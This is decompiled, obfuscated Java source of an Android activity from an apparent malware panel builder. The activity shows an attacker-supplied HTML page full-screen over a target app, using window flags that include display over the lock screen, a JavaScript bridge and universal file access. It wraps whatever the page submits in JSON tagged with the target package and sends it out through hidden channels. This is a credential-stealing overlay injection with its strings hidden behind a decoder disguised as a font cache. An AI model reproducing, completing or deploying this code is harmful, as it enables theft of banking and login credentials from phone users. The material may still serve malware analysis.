package app.mobilex.plus;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import org.json.JSONObject;
import v.s.C8V2BVpgJaAXfUQpn4;
import v.s.GQh1bKoqkKhujFH2nJ;
import v.s.KgSM0TsKUpCiuePB;
import v.s.LrAFnQmsCj4FH2rNSrOB;
import v.s.M7nX1jOjvcgOGxtZl;
import v.s.RWY6BVSB0XxPbw;
import v.s.iStgVlW5d7CQ5MhFi;
import v.s.jb8et6SZeK5TWMrJFxDX;
import v.s.umMdYoePNXvWWPn;
import v.s.xEMhlPHEg6l7ZCe0;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class HelperYOLoader extends Activity {
    public static volatile WebView Ee8d2j4S9Vm5yGuR;
    public WebView JXn4Qf7zpnLjP5;
    public String dDIMxZXP1V8HdM = "";
    public String w9sT1Swbhx3hs = "";
    public String vekpFI4d1Nc4fakF = "";

    static {
        TypefaceCache.obtain("001400730059008D00F500BC00C600A80031");
    }

    public static final void dDIMxZXP1V8HdM(HelperYOLoader helperYOLoader, String str) {
        JSONObject jSONObjectPut;
        try {
            try {
                jSONObjectPut = new JSONObject(str);
            } catch (Exception unused) {
                jSONObjectPut = new JSONObject().put(TypefaceCache.obtain("00310077004C"), str);
            }
            JSONObject jSONObject = jSONObjectPut;
            String str2 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            Context applicationContext = helperYOLoader.getApplicationContext();
            String str3 = helperYOLoader.dDIMxZXP1V8HdM;
            String str4 = helperYOLoader.w9sT1Swbhx3hs;
            GQh1bKoqkKhujFH2nJ.b1EoSIRjJHO5.add(str3);
            TypefaceCache.obtain("000E00770049008C00F500BB009200A400220066004F009200E200BA00D600FD0063");
            y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new M7nX1jOjvcgOGxtZl(applicationContext, str3, str4, jSONObject, null), 3);
            try {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002A00780051008200F300AB00ED00B500260065004E008B00E4"));
                jSONObject2.put(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"), helperYOLoader.dDIMxZXP1V8HdM);
                jSONObject2.put(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), helperYOLoader.w9sT1Swbhx3hs);
                jSONObject2.put(TypefaceCache.obtain("00200077004B009300E500AD00D700A3001C0072005A009300F1"), jSONObject);
                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                if (rWY6BVSB0XxPbw != null) {
                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject2);
                }
            } catch (Exception unused2) {
            }
            TypefaceCache.obtain("00070077004F008600B000BC00D300B7003700630049008200F400FF00D400A800310036");
            KgSM0TsKUpCiuePB.KV57Z6oavcB595B8Dy8Z(str, 200);
        } catch (Exception e) {
            TypefaceCache.obtain("002B00770055008300FC00BA00E000A2003000630057009300B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
        helperYOLoader.finish();
    }

    private static /* synthetic */ void kfbtcz() {
    }

    @Override // android.app.Activity
    public final void finish() {
        String str = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
        GQh1bKoqkKhujFH2nJ.pyu8ovAipBTLYAiKab = "";
        super.finish();
        overridePendingTransition(0, 0);
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        super.onBackPressed();
        overridePendingTransition(0, 0);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            getWindow().addFlags(4718880);
        } catch (Exception unused) {
        }
        String stringExtra = getIntent().getStringExtra(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"));
        if (stringExtra == null) {
            stringExtra = "";
        }
        this.dDIMxZXP1V8HdM = stringExtra;
        String stringExtra2 = getIntent().getStringExtra(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"));
        if (stringExtra2 == null) {
            stringExtra2 = this.dDIMxZXP1V8HdM;
        }
        this.w9sT1Swbhx3hs = stringExtra2;
        String stringExtra3 = getIntent().getStringExtra(TypefaceCache.obtain("002000630048009300FF00B200ED00AD0030"));
        if (stringExtra3 == null) {
            stringExtra3 = "";
        }
        this.vekpFI4d1Nc4fakF = stringExtra3;
        String stringExtra4 = getIntent().getStringExtra(TypefaceCache.obtain("002B00620056008B00CF00AF00D300B3002B"));
        String str = stringExtra4 != null ? stringExtra4 : "";
        if (this.dDIMxZXP1V8HdM.length() == 0 || str.length() == 0) {
            TypefaceCache.obtain("000E007F0048009400F900B100D500E70026006E004F009500F100AC");
            finish();
            return;
        }
        File file = new File(str);
        if (!file.exists()) {
            TypefaceCache.obtain("000B0042007600AB00B000B100DD00B3006300700054009200FE00BB008800E7");
            finish();
            return;
        }
        WebView webView = new WebView(this);
        this.JXn4Qf7zpnLjP5 = webView;
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setBuiltInZoomControls(false);
        webView.getSettings().setCacheMode(2);
        try {
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        } catch (Exception unused2) {
        }
        try {
            webView.setLayerType(2, null);
        } catch (Exception unused3) {
        }
        webView.setBackgroundColor(-1);
        webView.setScrollBarStyle(0);
        webView.addJavascriptInterface(new LrAFnQmsCj4FH2rNSrOB(this), TypefaceCache.obtain("00020078005F009500FF00B600D6"));
        webView.setWebChromeClient(new C8V2BVpgJaAXfUQpn4(this));
        webView.setWebViewClient(new xEMhlPHEg6l7ZCe0(this, 0));
        Ee8d2j4S9Vm5yGuR = webView;
        webView.loadUrl(TypefaceCache.obtain("0025007F0057008200AA00F0009D") + file.getAbsolutePath());
        setContentView(webView);
        overridePendingTransition(0, 0);
        TypefaceCache.obtain("000A00780051008200F300AB009200A8003500730049008B00F100A6009200A8003300730055008200F400FF00D400A800310036");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        Ee8d2j4S9Vm5yGuR = null;
        try {
            WebView webView = this.JXn4Qf7zpnLjP5;
            if (webView != null) {
                webView.destroy();
            }
        } catch (Exception unused) {
        }
        this.JXn4Qf7zpnLjP5 = null;
        super.onDestroy();
    }
}
